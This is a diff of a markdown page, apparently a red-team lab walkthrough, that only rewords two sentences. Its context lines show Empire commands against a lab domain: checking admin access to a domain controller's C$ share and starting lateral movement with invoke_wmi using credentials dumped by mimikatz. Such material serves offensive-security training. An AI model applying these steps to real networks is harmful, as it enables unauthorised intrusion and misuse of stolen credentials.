@@ -112,7 +112,7 @@ shell [DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainContr
 
 ![](../../.gitbook/assets/empire-get-dcname.png)
 
-Check if I have access to the DC-RED:
+Check if we have admin access to the `DC-RED`:
 
 ```csharp
 shell dir \\dc-red.red.offense.local\c$
@@ -122,7 +122,7 @@ shell dir \\dc-red.red.offense.local\c$
 
 ### Lateral Movement
 
-Let's get back an agent from DC-RED - note that the credentials are coming from the previous dump with mimikatz:
+Let's get back an agent from `DC-RED` - note that the credentials are coming from the previous dump with mimikatz:
 
 ```csharp
 usemodule lateral_movement/invoke_wmi
